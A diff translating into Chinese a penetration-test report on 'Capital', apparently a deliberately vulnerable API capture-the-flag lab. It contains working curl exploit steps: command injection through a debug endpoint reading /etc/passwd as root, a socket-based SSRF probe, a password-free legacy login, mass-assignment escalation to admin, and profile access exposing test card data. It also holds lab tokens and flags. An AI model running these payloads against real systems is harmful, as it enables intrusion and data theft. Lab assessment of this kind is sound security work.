@@ -1,119 +1,119 @@
-# Security Assessment Report
+# 安全评估报告
 
-## Executive Summary
-- Target: Capital
-- Assessment Date: January 2025
-- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+## 执行摘要
+- **目标:** Capital
+- **评估日期:** 2025年1月
+- **范围:** 认证、XSS、SQL和命令注入、SSRF、授权测试
 
-## Summary by Vulnerability Type
+## 按漏洞类型汇总
 
-**Authentication Vulnerabilities:**
- Critical authentication vulnerabilities were successfully exploited:
+**认证漏洞:**
+成功利用的关键认证漏洞：
 
-- Complete authentication bypass on legacy v1 endpoint allowing takeover of any account
-- Mass assignment privilege escalation enabling any user to become admin
-- Session hijacking via JavaScript-accessible tokens stored in localStorage
-- Unlimited brute force attacks with no rate limiting, resulting in credential discovery
+- 旧版 v1 端点上的完全认证绕过，允许接管任何账户
+- 大规模分配权限提升，允许任何用户成为管理员
+- 通过存储在 localStorage 中的 JavaScript 可访问令牌进行会话劫持
+- 无速率限制的无限暴力攻击，导致凭证发现
 
-**Authorization Vulnerabilities:**
- Critical authorization vulnerabilities were successfully exploited:
+**授权漏洞:**
+成功利用的关键授权漏洞：
 
-- Legacy authentication bypass providing complete account takeover
-- Horizontal authorization bypass enabling access to other users' financial data
-- Vertical authorization bypass allowing regular users to access admin functions
-- Mass assignment privilege escalation through self-service profile updates
-- Command injection via debug endpoint providing root-level system access
-- Admin workflow bypass allowing direct access to administrative functions
-- Debug endpoint exposed in production environment enabling system compromise
+- 旧版认证绕过，提供完全的账户接管
+- 水平授权绕过，允许访问其他用户的财务数据
+- 垂直授权绕过，允许普通用户访问管理员功能
+- 通过自助配置文件更新进行大规模分配权限提升
+- 通过调试端点的命令注入，提供根级系统访问
+- 管理员工作流程绕过，允许直接访问管理功能
+- 在生产环境中暴露的调试端点，允许系统入侵
 
-**Cross-Site Scripting (XSS) Vulnerabilities:**
-No XSS vulnerabilities were found. The application demonstrates robust XSS defenses through React's default HTML escaping, XSS library sanitization, and proper URL validation.
+**跨站脚本 (XSS) 漏洞:**
+未发现 XSS 漏洞。该应用程序通过 React 的默认 HTML 转义、XSS 库净化和适当的 URL 验证展示了强大的 XSS 防御。
 
-**SQL/Command Injection Vulnerabilities:**
-One critical command injection vulnerability was successfully exploited:
+**SQL/命令注入漏洞:**
+成功利用的一个关键命令注入漏洞：
 
-- Debug API endpoint allowing arbitrary command execution with root privileges through semicolon command chaining, leading to complete system compromise including sensitive data extraction and potential for data exfiltration or system destruction
+- 调试 API 端点允许通过分号命令链接执行具有根权限的任意命令，导致完全的系统入侵，包括敏感数据提取和可能的数据泄露或系统破坏
 
-**Server-Side Request Forgery (SSRF) Vulnerabilities:**
-One high-severity SSRF vulnerability was successfully exploited:
+**服务器端请求伪造 (SSRF) 漏洞:**
+成功利用的一个高严重性 SSRF 漏洞：
 
-- Network boundary bypass via command injection in debug endpoint, enabling SSRF attacks to access internal services through Python socket connections
+- 通过调试端点中的命令注入实现网络边界绕过，使 SSRF 攻击能够通过 Python 套接字连接访问内部服务
 
-## Network Reconnaissance
-[REDACTED]
+## 网络侦察
+[已编辑]
 
-# Injection Exploitation Evidence
+# 注入利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### INJ-VULN-01: Command Injection via Debug API Endpoint
+### INJ-VULN-01: 通过调试 API 端点的命令注入
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** HTTP POST `/api/debug` endpoint at `http://capital-api.sandbox.local:8000/api/debug`
-- **Overview:** Direct command injection through insufficient input validation allowing arbitrary command execution with root privileges
-- **Impact:** Complete system compromise with root-level access, sensitive data extraction, and potential for data exfiltration or system destruction
-- **Severity:** Critical
+- **漏洞位置:** HTTP POST `/api/debug` 端点，位于 `http://capital-api.sandbox.local:8000/api/debug`
+- **概述:** 通过输入验证不足进行直接命令注入，允许以根权限执行任意命令
+- **影响:** 具有根级别访问权限的完全系统入侵，敏感数据提取，以及可能的数据泄露或系统破坏
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid JWT authentication token (easily obtainable through user registration)
-- HTTP access to port 8000 on the target system
+- 有效的 JWT 认证令牌（通过用户注册轻松获取）
+- 对目标系统上端口 8000 的 HTTP 访问
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Register a user account to obtain JWT token:**
+1. **注册用户账户以获取 JWT 令牌:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
-    -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
+    -H "Content-Type: application/json" \
     -d '{"user":{"username":"exploit9999","email":"exploit9999@test.com","password":"testpassword"}}'
     
     ```
     
-    Response includes JWT token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXQ5OTk5IiwiZXhwIjoxNzU5MTc0NTc0LCJzdWIiOiJhY2Nlc3MifQ.7Lfo9DRWpaac_yOmBY1i73GzNH5m2zU6Cd1MZDvNrgE`
+    响应包含 JWT 令牌: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXQ5OTk5IiwiZXhwIjoxNzU5MTc0NTc0LCJzdWIiOiJhY2Nlc3MifQ.7Lfo9DRWpaac_yOmBY1i73GzNH5m2zU6Cd1MZDvNrgE`
     
-2. **Execute command injection to extract sensitive data:**
+2. **执行命令注入以提取敏感数据:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-    -H "Content-Type: application/json" \\
-    -H "Authorization: Token [JWT_TOKEN]" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Token [JWT_TOKEN]" \
     -d '{"body":{"command":"uptime; cat /etc/passwd"}}'
     
     ```
     
-3. **Confirm root-level privilege escalation:**
+3. **确认根级别权限提升:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-    -H "Content-Type: application/json" \\
-    -H "Authorization: Token [JWT_TOKEN]" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Token [JWT_TOKEN]" \
     -d '{"body":{"command":"uptime; whoami; id; pwd"}}'
     
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-**Complete System Compromise Achieved:**
+**已实现完全系统入侵:**
 
-- **Root Access Confirmed:** Command execution as root user (uid=0, gid=0)
-- **Sensitive Data Extracted:** Complete `/etc/passwd` file containing all system users
-- **System Information Gathered:** Working directory `/capital`, system uptime, load averages
+- **确认根访问权限:** 以根用户 (uid=0, gid=0) 执行命令
+- **提取敏感数据:** 完整的 `/etc/passwd` 文件，包含所有系统用户
+- **收集系统信息:** 工作目录 `/capital`，系统运行时间，负载平均值
 
-**Sample Extracted Data:**
+**提取的数据样本:**
 
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
-[...complete user list...]
+[...完整用户列表...]
 
 ```
 
-**User Context:**
+**用户上下文:**
 
 ```
 uid=0(root) gid=0(root) groups=0(root)
@@ -121,54 +121,54 @@ Working Directory: /capital
 
 ```
 
-**Technical Details:**
+**技术详情:**
 
-- **Vulnerability Type:** Command Injection (CWE-78)
-- **Root Cause:** Insufficient input validation with semicolon command chaining bypass
-- **Bypass Method:** The filter only blocks `"rm"` and `"||"` but allows semicolon (`;`) command chaining
-- **Attack Vector:** `uptime; [ARBITRARY_COMMAND]` pattern successfully bypasses whitelist validation
-- **Authentication:** Standard JWT authentication required (easily bypassed through user registration)
+- **漏洞类型:** 命令注入 (CWE-78)
+- **根本原因:** 输入验证不足，分号命令链接绕过
+- **绕过方法:** 过滤器仅阻止 `"rm"` 和 `"||"`，但允许分号 (`;`) 命令链接
+- **攻击向量:** `uptime; [ARBITRARY_COMMAND]` 模式成功绕过白名单验证
+- **认证:** 需要标准 JWT 认证（通过用户注册轻松绕过）
 
-**Notes:**
-The vulnerability allows complete system compromise. An attacker with this access could:
+**注意事项:**
+该漏洞允许完全的系统入侵。拥有此访问权限的攻击者可以：
 
-- Extract all sensitive data from the filesystem
-- Install backdoors or malware
-- Pivot to other systems on the network
-- Cause complete system destruction
-- Access application databases and configuration files
+- 从文件系统中提取所有敏感数据
+- 安装后门或恶意软件
+- 转向网络上的其他系统
+- 造成完全的系统破坏
+- 访问应用程序数据库和配置文件
 
-This represents one of the most severe types of vulnerabilities possible in a web application.
+这代表了 web 应用程序中可能出现的最严重类型的漏洞之一。
 
-# Cross-Site Scripting (XSS) Exploitation Evidence
+# 跨站脚本 (XSS) 利用证据
 
-*No XSS vulnerabilities were successfully exploited - exploitation queue was empty.*
+*未成功利用任何 XSS 漏洞 - 利用队列为空。*
 
-# Authentication Exploitation Evidence
+# 认证利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### AUTH-VULN-06: Complete Authentication Bypass on Legacy v1 Endpoint
+### AUTH-VULN-06: 旧版 v1 端点上的完全认证绕过
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** `/api/v1/users/login` endpoint
-- **Overview:** Legacy endpoint completely bypasses password validation, allowing authentication with any email and any password
-- **Impact:** Complete authentication bypass enabling immediate account takeover of any user
-- **Severity:** Critical
+- **漏洞位置:** `/api/v1/users/login` 端点
+- **概述:** 旧版端点完全绕过密码验证，允许使用任何电子邮件和任何密码进行认证
+- **影响:** 完全的认证绕过，允许立即接管任何用户的账户
+- **严重性:** 严重
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Target the legacy authentication endpoint directly on the backend:
+1. 直接在后端上定位旧版认证端点：
     
     ```bash
-    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \\
-      -H "Content-Type: application/json" \\
+    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \
+      -H "Content-Type: application/json" \
       -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "anything"}}'
     
     ```
     
-2. The endpoint returns successful authentication with user data and token:
+2. 端点返回成功的认证，包含用户数据和令牌：
     
     ```json
     {
@@ -183,53 +183,53 @@ This represents one of the most severe types of vulnerabilities possible in a we
     
     ```
     
-3. Verify bypass works with any user and any password:
+3. 验证绕过适用于任何用户和任何密码：
     
     ```bash
-    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \\
-      -H "Content-Type: application/json" \\
+    curl -X POST <http://capital-api.sandbox.local:8000/api/v1/users/login> \
+      -H "Content-Type: application/json" \
       -d '{"user": {"email": "bob_dev@checkmarx.com", "password": "wrongpassword"}}'
     
     ```
     
 
-**Proof of Impact:**
-Successfully authenticated as multiple users (`Pikachu@checkmarx.com`, `bob_dev@checkmarx.com`) using completely wrong passwords. Flag `flag{Impr0peR_Ass3ts_ManAg3m3nt}` confirms successful exploitation.
+**影响证明:**
+成功使用完全错误的密码认证为多个用户 (`Pikachu@checkmarx.com`, `bob_dev@checkmarx.com`)。标志 `flag{Impr0peR_Ass3ts_ManAg3m3nt}` 确认成功利用。
 
-### AUTH-VULN-08: Mass Assignment Privilege Escalation
+### AUTH-VULN-08: 大规模分配权限提升
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** `PUT /api/user` endpoint
-- **Overview:** User update endpoint allows setting admin=true via mass assignment without authorization checks
-- **Impact:** Any authenticated user can escalate to admin privileges and access administrative functions
-- **Severity:** Critical
+- **漏洞位置:** `PUT /api/user` 端点
+- **概述:** 用户更新端点允许通过大规模分配设置 admin=true，无需授权检查
+- **影响:** 任何已认证用户都可以升级为管理员权限并访问管理功能
+- **严重性:** 严重
 
-**Prerequisites:**
-Valid JWT token from authentication
+**先决条件:**
+来自认证的有效 JWT 令牌
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Authenticate as a regular user to obtain JWT token:
+1. 以普通用户身份认证以获取 JWT 令牌：
     
     ```bash
-    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \\
-      -H "Content-Type: application/json" \\
+    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \
+      -H "Content-Type: application/json" \
       -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
     
     ```
     
-2. Use the JWT token to escalate privileges via mass assignment:
+2. 使用 JWT 令牌通过大规模分配提升权限：
     
     ```bash
-    curl -X PUT <http://capital-api.sandbox.local:8000/api/user> \\
-      -H "Content-Type: application/json" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
+    curl -X PUT <http://capital-api.sandbox.local:8000/api/user> \
+      -H "Content-Type: application/json" \
+      -H "Authorization: Token [JWT_TOKEN]" \
       -d '{"user": {"admin": true}}'
     
     ```
     
-3. Server responds with elevated privileges:
+3. 服务器以提升的权限响应：
     
     ```json
     {
@@ -244,113 +244,113 @@ Valid JWT token from authentication
     ```
     
 
-**Proof of Impact:**
-Response shows `"admin": true` and includes flag `flag{M4sS_AsS1gnm3nt}` confirming successful privilege escalation from regular user to admin.
+**影响证明:**
+响应显示 `"admin": true` 并包含标志 `flag{M4sS_AsS1gnm3nt}`，确认从普通用户到管理员的成功权限提升。
 
-### AUTH-VULN-04: Session Hijacking via JavaScript-Accessible Tokens
+### AUTH-VULN-04: 通过 JavaScript 可访问令牌的会话劫持
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** Frontend application localStorage storage
-- **Overview:** JWT tokens stored in localStorage are accessible to JavaScript, enabling XSS-based session hijacking
-- **Impact:** Any XSS vulnerability can steal authentication tokens and hijack user sessions
-- **Severity:** High
+- **漏洞位置:** 前端应用程序 localStorage 存储
+- **概述:** 存储在 localStorage 中的 JWT 令牌可通过 JavaScript 访问，启用基于 XSS 的会话劫持
+- **影响:** 任何 XSS 漏洞都可以窃取认证令牌并劫持用户会话
+- **严重性:** 高
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Access the frontend application via browser:
+1. 通过浏览器访问前端应用程序：
     
     ```
     <https://capital-api.sandbox.local:4100>
     
     ```
     
-2. Demonstrate JavaScript access to stored tokens:
+2. 演示 JavaScript 对存储令牌的访问：
     
     ```jsx
-    // Simulate XSS attack stealing token
+    // 模拟窃取令牌的 XSS 攻击
     const stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...";
     localStorage.setItem('jwt', stolenToken);
     
-    // Verify token is accessible
-    localStorage.getItem('jwt'); // Returns the token
+    // 验证令牌可访问
+    localStorage.getItem('jwt'); // 返回令牌
     
     ```
     
-3. Use stolen token to access protected resources:
+3. 使用窃取的令牌访问受保护的资源：
     
     ```bash
-    curl -X GET <http://capital-api.sandbox.local:8000/api/user> \\
+    curl -X GET <http://capital-api.sandbox.local:8000/api/user> \
       -H "Authorization: Token [STOLEN_JWT_TOKEN]"
     
     ```
     
 
-**Proof of Impact:**
-Successfully demonstrated that JWT tokens can be injected and retrieved via JavaScript `localStorage.getItem('jwt')`. This proves any XSS attack can steal authentication tokens for session hijacking.
+**影响证明:**
+成功演示了 JWT 令牌可以通过 JavaScript `localStorage.getItem('jwt')` 注入和检索。这证明任何 XSS 攻击都可以窃取认证令牌以进行会话劫持。
 
-### AUTH-VULN-02: No Rate Limiting Enables Brute Force
+### AUTH-VULN-02: 无速率限制启用暴力攻击
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** `POST /api/v2/users/login`
-- **Impact:** Unlimited brute force attacks discovered valid credentials and compromised accounts
-- **Severity:** High
+- **漏洞位置:** `POST /api/v2/users/login`
+- **影响:** 无限暴力攻击发现有效凭证并泄露账户
+- **严重性:** 高
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Automated brute force attack against login endpoint with 25 password attempts:
+1. 针对登录端点的自动暴力攻击，尝试 25 个密码：
     
     ```
-    Target: bob_dev@checkmarx.com
-    Passwords tested: ["password", "123456", "admin", "test", "IamDev", ...]
-    
-    ```
-    
-2. Script processed all attempts without rate limiting:
-    - Total attempts: 25
-    - No HTTP 429 responses
-    - No progressive delays
-    - No account lockout
-3. Successfully discovered valid credentials:
-    
-    ```
-    Email: bob_dev@checkmarx.com
-    Password: IamDev
+    目标: bob_dev@checkmarx.com
+    测试的密码: ["password", "123456", "admin", "test", "IamDev", ...]
     
     ```
     
+2. 脚本处理所有尝试，无速率限制：
+    - 总尝试次数: 25
+    - 无 HTTP 429 响应
+    - 无渐进式延迟
+    - 无账户锁定
+3. 成功发现有效凭证：
+    
+    ```
+    电子邮件: bob_dev@checkmarx.com
+    密码: IamDev
+    
+    ```
+    
 
-**Evidence of Vulnerability:**
-Brute force script in `/Users/arjunmalleswaran/Code/pentest-repos/capital/auth_brute_force_test.py` successfully processed 25 rapid authentication attempts without any protective measures. Valid credentials discovered proving the attack's effectiveness.
+**漏洞证据:**
+位于 `/Users/arjunmalleswaran/Code/pentest-repos/capital/auth_brute_force_test.py` 的暴力脚本成功处理了 25 次快速认证尝试，无任何保护措施。发现的有效凭证证明了攻击的有效性。
 
-### AUTH-VULN-01: Transport Layer Credential Interception
+### AUTH-VULN-01: 传输层凭证拦截
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** Mixed content architecture between HTTPS frontend (port 4100) and HTTP backend (port 8000)
-- **Impact:** All authentication data transmitted in plaintext, enabling credential interception
-- **Severity:** Critical
+- **漏洞位置:** HTTPS 前端（端口 4100）和 HTTP 后端（端口 8000）之间的混合内容架构
+- **影响:** 所有认证数据以明文传输，启用凭证拦截
+- **严重性:** 严重
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. Frontend serves content over HTTPS:
+1. 前端通过 HTTPS 提供内容：
     
     ```
     <https://capital-api.sandbox.local:4100>
     
     ```
     
-2. Backend API accessible over unencrypted HTTP:
+2. 后端 API 通过未加密的 HTTP 可访问：
     
     ```bash
-    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \\
-      -H "Content-Type: application/json" \\
+    curl -X POST <http://capital-api.sandbox.local:8000/api/v2/users/login> \
+      -H "Content-Type: application/json" \
       -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
     
     ```
     
-3. Network traffic shows plaintext credential transmission:
+3. 网络流量显示明文凭证传输：
     
     ```
     POST /api/v2/users/login HTTP/1.1
@@ -362,104 +362,104 @@ Brute force script in `/Users/arjunmalleswaran/Code/pentest-repos/capital/auth_b
     ```
     
 
-**Evidence of Vulnerability:**
-Direct HTTP access to backend demonstrates mixed content vulnerability. All authentication requests, including passwords and JWT tokens, are transmitted without encryption and can be intercepted by network attackers.
+**漏洞证据:**
+对后端的直接 HTTP 访问演示了混合内容漏洞。所有认证请求，包括密码和 JWT 令牌，都未经加密传输，可被网络攻击者拦截。
 
-# SSRF Exploitation Evidence
+# SSRF 利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### SSRF-VULN-01: Command Injection enabling SSRF in Debug Endpoint
+### SSRF-VULN-01: 调试端点中启用 SSRF 的命令注入
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** POST /api/debug endpoint
-- **Impact:** Network boundary bypass via command injection, enabling SSRF attacks to access internal services
-- **Severity:** High
+- **漏洞位置:** POST /api/debug 端点
+- **影响:** 通过命令注入的网络边界绕过，启用 SSRF 攻击以访问内部服务
+- **严重性:** 高
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid JWT authentication token (obtained via user registration or authentication bypass)
-- Access to debug endpoint at `/api/debug`
+- 有效的 JWT 认证令牌（通过用户注册或认证绕过获得）
+- 访问 `/api/debug` 处的调试端点
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Obtain Authentication Token via User Registration:**
+1. **通过用户注册获取认证令牌:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
-      -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
+      -H "Content-Type: application/json" \
       -d '{"user": {"username": "ssrftester", "email": "ssrftester@example.com", "password": "password123"}}'
     
     ```
     
-    **Response:** JWT token in response body: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNzcmZ0ZXN0ZXIiLCJleHAiOjE3NTkxNzQ0OTMsInN1YiI6ImFjY2VzcyJ9.gvXEUVS_STxz-JepDoVWgPRWBrmQ2PWZaQC0PDmBCbM`
+    **响应:** 响应体中的 JWT 令牌: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNzcmZ0ZXN0ZXIiLCJleHAiOjE3NTkxNzQ0OTMsInN1YiI6ImFjY2VzcyJ9.gvXEUVS_STxz-JepDoVWgPRWBrmQ2PWZaQC0PDmBCbM`
     
-2. **Test Command Injection Vulnerability:**
+2. **测试命令注入漏洞:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-      -H "Content-Type: application/json" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+      -H "Content-Type: application/json" \
+      -H "Authorization: Token [JWT_TOKEN]" \
       -d '{"body": {"command": "uptime; id"}}'
     
     ```
     
-    **Response:** Command injection confirmed with root privileges and injection flag
+    **响应:** 确认命令注入，具有根权限和注入标志
     
-3. **Demonstrate Internal Network Access via SSRF:**
+3. **演示通过 SSRF 访问内部网络:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \\
-      -H "Content-Type: application/json" \\
-      -H "Authorization: Token [JWT_TOKEN]" \\
-      -d '{"body": {"command": "uptime; /usr/local/bin/python3 -c \\"import socket; s=socket.socket(); s.connect(('"'"'127.0.0.1'"'"', 8000)); print('"'"'Connected to 127.0.0.1:8000'"'"'); s.close()\\""}}'
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/debug>" \
+      -H "Content-Type: application/json" \
+      -H "Authorization: Token [JWT_TOKEN]" \
+      -d '{"body": {"command": "uptime; /usr/local/bin/python3 -c \"import socket; s=socket.socket(); s.connect((\'127.0.0.1\', 8000)); print(\'Connected to 127.0.0.1:8000\'); s.close()\""}}'
     
     ```
     
-    **Response:** Successful socket connection to internal service confirmed
+    **响应:** 确认成功连接到内部服务
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- **Command Injection Confirmed:** Successfully executed arbitrary commands via `;` command chaining
-- **Root Privileges:** Executed commands run as uid=0(root) with full system access
-- **Network Boundary Bypass:** Successfully established socket connections to internal services (127.0.0.1:8000)
-- **Flag Retrieved:** `flag{1nject10n_Ap1}` - indicates successful command injection exploitation
-- **Internal Service Access:** Demonstrated ability to connect to localhost services, proving SSRF capability through the command injection vector
+- **确认命令注入:** 成功通过 `;` 命令链接执行任意命令
+- **根权限:** 执行的命令以 uid=0(root) 运行，具有完全系统访问权限
+- **网络边界绕过:** 成功建立到内部服务的套接字连接 (127.0.0.1:8000)
+- **获取标志:** `flag{1nject10n_Ap1}` - 表示成功的命令注入利用
+- **内部服务访问:** 演示了连接到本地主机服务的能力，通过命令注入向量证明 SSRF 能力
 
-**Notes:**
+**注意事项:**
 
-- The vulnerability allows network reconnaissance and internal service access through Python socket connections
-- While HTTP client tools (curl, wget) are not available or are filtered, Python's socket module provides full network access capability
-- This represents an indirect SSRF vector through command injection rather than direct URL manipulation
-- The attack demonstrates Level 2 proof (partial network access) with confirmed ability to reach internal network boundaries
+- 该漏洞允许通过 Python 套接字连接进行网络侦察和内部服务访问
+- 虽然 HTTP 客户端工具（curl、wget）不可用或被过滤，但 Python 的套接字模块提供了完整的网络访问能力
+- 这代表通过命令注入的间接 SSRF 向量，而非直接 URL 操作
+- 攻击演示了第 2 级证明（部分网络访问），确认能够到达内部网络边界
 
-# Authorization Exploitation Evidence
+# 授权利用证据
 
-## Successfully Exploited Vulnerabilities
+## 成功利用的漏洞
 
-### AUTHZ-VULN-07: Legacy Authentication Bypass (Critical Impact)
+### AUTHZ-VULN-07: 旧版认证绕过（严重影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** POST /api/v1/users/login
-- **Overview:** Complete authentication bypass for any valid email address without password verification
-- **Impact:** Full account takeover for any existing user, unauthorized access to protected resources
-- **Severity:** Critical
+- **漏洞位置:** POST /api/v1/users/login
+- **概述:** 对任何有效电子邮件地址的完全认证绕过，无需密码验证
+- **影响:** 对任何现有用户的完全账户接管，对受保护资源的未授权访问
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Knowledge of any valid email address in the system (can be enumerated)
-- Access to the hidden v1 API endpoint
+- 系统中任何有效电子邮件地址的知识（可枚举）
+- 对隐藏的 v1 API 端点的访问
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Send authentication request to legacy endpoint:**
+1. **向后端旧版端点发送认证请求:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/v1/users/login>" \\
-      -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/v1/users/login>" \
+      -H "Content-Type: application/json" \
       -d '{
         "user": {
           "email": "user@test.com",
@@ -469,7 +469,7 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     
     ```
     
-2. **Receive successful authentication response:**
+2. **接收成功的认证响应:**
     
     ```json
     {
@@ -488,34 +488,34 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully obtained valid JWT token: "Keep it up!"
-- Bypassed password verification entirely
-- Captured CTF flag: `flag{Impr0peR_Ass3ts_ManAg3m3nt}`
-- Gained authenticated session for further exploitation
+- 成功获取有效 JWT 令牌: "Keep it up!"
+- 完全绕过密码验证
+- 捕获 CTF 标志: `flag{Impr0peR_Ass3ts_ManAg3m3nt}`
+- 获得认证会话以进行进一步利用
 
-### AUTHZ-VULN-03: Horizontal Authorization Bypass - Profile Access (High Impact)
+### AUTHZ-VULN-03: 水平授权绕过 - 配置文件访问（高影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** GET /api/profiles/{username}
-- **Overview:** Any authenticated user can access any other user's profile data including sensitive financial information
-- **Impact:** Unauthorized access to personally identifiable information and financial data
-- **Severity:** High
+- **漏洞位置:** GET /api/profiles/{username}
+- **概述:** 任何已认证用户都可以访问任何其他用户的配置文件数据，包括敏感的财务信息
+- **影响:** 对个人身份信息和财务数据的未授权访问
+- **严重性:** 高
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token (obtained from AUTHZ-VULN-07)
-- Knowledge of target usernames (TeamR$cket contains sensitive data)
+- 有效的认证令牌（从 AUTHZ-VULN-07 获得）
+- 目标用户名的知识（TeamR$cket 包含敏感数据）
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Register legitimate user account:**
+1. **注册合法用户账户:**
     
     ```bash
-    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \\
-      -H "Content-Type: application/json" \\
+    curl -X POST "<http://capital-api.sandbox.local:8000/api/users>" \
+      -H "Content-Type: application/json" \
       -d '{
         "user": {
           "username": "exploiter1",
@@ -526,56 +526,56 @@ Direct HTTP access to backend demonstrates mixed content vulnerability. All auth
     
     ```
     
-2. **Extract JWT token from registration response:**
+2. **从注册响应中提取 JWT 令牌:**
     
     ```
     Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV4cGxvaXRlcjEiLCJleHAiOjE3NTkxNzQ1MzcsInN1YiI6ImFjY2VzcyJ9.vQVA7XoKGUtj14ZrL4SGNriRIPMtjZkmIZ67NTqAJZU
     
     ```
     
-3. **Access another user's profile (TeamR$cket):**
+3. **访问另一个用户的配置文件 (TeamR$cket):**
     
     ```bash
-    curl "<http://capital-api.sandbox.local:8000/api/profiles/TeamR\\$cket>" \\
+    curl "<http://capital-api.sandbox.local:8000/api/profiles/TeamR\$cket>" \
       -H "Authorization: Token [JWT_TOKEN]"
     
     ```
     
 
-**Proof of Impact:**
+**影响证明:**
 
-- Successfully accessed TeamR$cket's profile containing sensitive financial data:
-    - **Card Name:** Team Rocket
-    - **Credit Card Number:** 4426111122223333
+- 成功访问 TeamR$cket 的配置文件，包含敏感财务数据：
+    - **卡名:** Team Rocket
+    - **信用卡号:** 4426111122223333
     - **CVC:** 555
-    - **Expiry:** 0922
-- Captured CTF flag: `flag{M4sS_AsS1gnm3nt}`
-- Demonstrated horizontal privilege escalation (accessing data belonging to other users)
+    - **到期日:** 0922
+- 捕获 CTF 标志: `flag{M4sS_AsS1gnm3nt}`
+- 演示了水平权限提升（访问属于其他用户的数据）
 
-### AUTHZ-VULN-04: Vertical Authorization Bypass - Admin Access (Critical Impact)
+### AUTHZ-VULN-04: 垂直授权绕过 - 管理员访问（严重影响）
 
-**Summary:**
+**摘要:**
 
-- **Vulnerable location:** GET /api/admin
-- **Overview:** Regular user accounts can access administrative functions without proper role verification
-- **Impact:** Unauthorized access to admin-only functionality and sensitive admin resources
-- **Severity:** Critical
+- **漏洞位置:** GET /api/admin
+- **概述:** 普通用户账户可以访问管理功能，无需适当的角色验证
+- **影响:** 对仅管理员功能和敏感管理员资源的未授权访问
+- **严重性:** 严重
 
-**Prerequisites:**
+**先决条件:**
 
-- Valid authentication token (any authenticated user)
+- 有效的认证令牌（任何已认证用户）
 
-**Exploitation Steps:**
+**利用步骤:**
 
-1. **Access admin endpoint with regular user token:**
+1. **使用普通用户令牌访问管理员端点:**
     
     ```bash
-    curl "<http://capital-api.sandbox.local:8000/api/admin>" \\
